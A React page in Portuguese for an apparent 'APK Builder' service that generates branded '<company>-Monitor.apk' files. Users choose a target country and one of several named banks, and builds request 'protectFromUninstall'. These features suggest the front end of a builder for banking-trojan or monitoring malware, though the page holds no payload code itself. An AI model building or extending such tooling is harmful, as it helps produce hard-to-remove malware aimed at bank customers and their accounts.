import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2, Download } from "lucide-react";

import { trpc } from "@/lib/trpc";
import { useState } from "react";

export default function APKBuilderPage() {
  // Check authentication from localStorage
  const userEmail = localStorage.getItem("user_email");
  const userName = localStorage.getItem("user_name");
  const isAuthenticated = !!(userEmail && userName);
  
  const logout = () => {
    localStorage.removeItem("auth_token");
    localStorage.removeItem("auth_timestamp");
    localStorage.removeItem("user_email");
    localStorage.removeItem("user_name");
    window.location.href = "/";
  };
  const [companyName, setCompanyName] = useState('FazTudo');
  const [companyUrl, setCompanyUrl] = useState('https://faztudo.com.br');
  const [logoUrl, setLogoUrl] = useState('https://via.placeholder.com/150');
  const [selectedCountry, setSelectedCountry] = useState('BR');
  const [selectedBank, setSelectedBank] = useState('bb');
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [downloadUrl, setDownloadUrl] = useState<string | null>(null);

  const buildMutation = trpc.apk.build.useMutation();

  const countries = [
    { code: 'BR', name: 'Brasil' },
    { code: 'US', name: 'Estados Unidos' },
    { code: 'MX', name: 'México' },
    { code: 'AR', name: 'Argentina' },
    { code: 'CL', name: 'Chile' },
    { code: 'CO', name: 'Colômbia' },
    { code: 'PE', name: 'Peru' },
  ];

  const banks = [
    { id: 'bb', name: 'Banco do Brasil' },
    { id: 'itau', name: 'Itaú Unibanco' },
    { id: 'bradesco', name: 'Banco Bradesco' },
    { id: 'santander', name: 'Banco Santander' },
    { id: 'nubank', name: 'Nubank' },
    { id: 'caixa', name: 'Caixa Econômica' },
    { id: 'hsbc', name: 'HSBC' },
    { id: 'inter', name: 'Banco Inter' },
    { id: 'banrisul', name: 'Banrisul' },
  ];

  const handleBuildAPK = async () => {
    if (!companyName.trim() || !companyUrl.trim()) {
      alert('Por favor, preencha todos os campos');
      return;
    }

    setIsBuilding(true);
    setBuildProgress(0);

    const interval = setInterval(() => {
      setBuildProgress((prev) => {
        if (prev >= 90) {
          clearInterval(interval);
          return prev;
        }
        return prev + Math.random() * 30;
      });
    }, 500);

    try {
      const result = await buildMutation.mutateAsync({
        companyName,
        companyUrl,
        logoUrl: logoUrl || undefined,
        protectFromUninstall: true,
      });

      clearInterval(interval);
      setBuildProgress(100);

      if (result.success && result.downloadUrl) {
        setDownloadUrl(result.downloadUrl);
        
        setTimeout(() => {
          const link = document.createElement('a');
          link.href = result.downloadUrl;
          link.download = `${companyName}-Monitor.apk`;
          link.click();
        }, 1000);
      } else {
        alert('Erro ao gerar APK');
      }
    } catch (error) {
      alert('Erro ao gerar APK: ' + (error instanceof Error ? error.message : 'Erro desconhecido'));
      clearInterval(interval);
    } finally {
      setIsBuilding(false);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-900 to-slate-800">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-4">Bem-vindo</h1>
          <p className="text-slate-400 mb-8">Faça login para continuar</p>
          <Button
            onClick={() => (window.location.href = "/login")}
            className="bg-blue-600 hover:bg-blue-700 text-white"
          >
            Entrar
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 p-4 md:p-8">
      <div className="max-w-4xl mx-auto">
        <div className="mb-8 flex justify-between items-center">
          <h1 className="text-4xl font-bold text-cyan-300">🔨 APK Builder</h1>
          <Button
            onClick={logout}
            variant="outline"
            className="border-red-400/30 text-red-300 hover:bg-red-900/20"
          >
            Sair
          </Button>
        </div>

        <div className="bg-slate-900 border border-cyan-400/30 rounded-lg overflow-hidden">
          <div className="bg-slate-900 border-b border-cyan-400/30 p-6">
            <p className="text-slate-400">Gere seu APK customizado com sua marca</p>
          </div>

          <div className="p-6">
            <div className="grid md:grid-cols-2 gap-8">
              {/* Formulário */}
              <div>
                <h3 className="text-lg font-bold text-cyan-300 mb-6">📋 Informações da Empresa</h3>

                <div className="mb-4">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Nome da Empresa *
                  </label>
                  <Input
                    type="text"
                    placeholder="Ex: FazTudo"
                    value={companyName}
                    onChange={(e) => setCompanyName(e.target.value)}
                    disabled={isBuilding}
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                  />
                </div>

                <div className="mb-4">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    URL da Empresa *
                  </label>
                  <Input
                    type="url"
                    placeholder="Ex: https://faztudo.com.br"
                    value={companyUrl}
                    onChange={(e) => setCompanyUrl(e.target.value)}
                    disabled={isBuilding}
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                  />
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Logo da Empresa (URL)
                  </label>
                  <Input
                    type="url"
                    placeholder="Ex: https://..."
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    disabled={isBuilding}
                    className="bg-slate-700/50 border-cyan-400/30 text-white"
                  />
                </div>

                {/* Country and Bank dropdowns - Version 1.0.1 */}
                <div className="mb-4">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    País
                  </label>
                  <select
                    value={selectedCountry}
                    onChange={(e) => setSelectedCountry(e.target.value)}
                    disabled={isBuilding}
                    className="w-full bg-slate-700/50 border border-cyan-400/30 text-white rounded px-3 py-2"
                  >
                    {countries.map((c) => (
                      <option key={c.code} value={c.code}>
                        {c.name}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Banco
                  </label>
                  <select
                    value={selectedBank}
                    onChange={(e) => setSelectedBank(e.target.value)}
                    disabled={isBuilding}
                    className="w-full bg-slate-700/50 border border-cyan-400/30 text-white rounded px-3 py-2"
                  >
                    {banks.map((b) => (
                      <option key={b.id} value={b.id}>
                        {b.name}
                      </option>
                    ))}
                  </select>
                </div>

                <Button
                  onClick={handleBuildAPK}
                  disabled={isBuilding}
                  className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-3 rounded-lg disabled:opacity-50"
                >
                  {isBuilding ? (
                    <>
                      <div className="animate-spin inline-block mr-2 w-4 h-4 border-2 border-white border-t-transparent rounded-full"></div>
                      Gerando APK...
                    </>
                  ) : (
                    <>
                      <Download className="inline-block mr-2 w-4 h-4" />
                      ▶ Build APK
                    </>
                  )}
                </Button>

                {isBuilding && (
                  <div className="mt-4">
                    <div className="flex justify-between text-xs text-slate-400 mb-2">
                      <span>Progresso</span>
                      <span>{Math.round(buildProgress)}%</span>
                    </div>
                    <div className="w-full bg-slate-700/50 rounded-full h-2">
                      <div
                        className="bg-gradient-to-r from-blue-500 to-cyan-500 h-full transition-all"
                        style={{ width: `${buildProgress}%` }}
                      ></div>
                    </div>
                  </div>
                )}

                {downloadUrl && (
                  <div className="mt-4 p-3 bg-green-900/20 border border-green-400/30 rounded-lg">
                    <p className="text-green-300 text-sm">✅ APK gerado com sucesso!</p>
                    <p className="text-slate-400 text-xs mt-2 break-all">{downloadUrl}</p>
                    <Button
                      onClick={() => {
                        const link = document.createElement('a');
                        link.href = downloadUrl;
                        link.download = `${companyName}-Monitor.apk`;
                        link.click();
                      }}
                      className="w-full mt-3 bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded"
                    >
                      📥 Baixar APK
                    </Button>
                  </div>
                )}
              </div>

              {/* Prévia */}
              <div>
                <h3 className="text-lg font-bold text-cyan-300 mb-6">👁️ Prévia do App</h3>

                <div className="flex justify-center">
                  <div className="w-64 bg-slate-700 rounded-3xl border-8 border-slate-800 overflow-hidden shadow-2xl">
                    <div className="bg-black h-96 flex flex-col items-center justify-center p-4">
                      {logoUrl && (
                        <img 
                          src={logoUrl} 
                          alt="Logo" 
                          className="w-20 h-20 rounded-lg mb-4 object-cover"
                          onError={(e) => {
                            (e.target as HTMLImageElement).src = 'https://via.placeholder.com/80';
                          }}
                        />
                      )}
                      <p className="text-white text-center font-bold text-sm">{companyName}</p>
                      <p className="text-slate-400 text-xs text-center mt-2 break-words">{companyUrl}</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
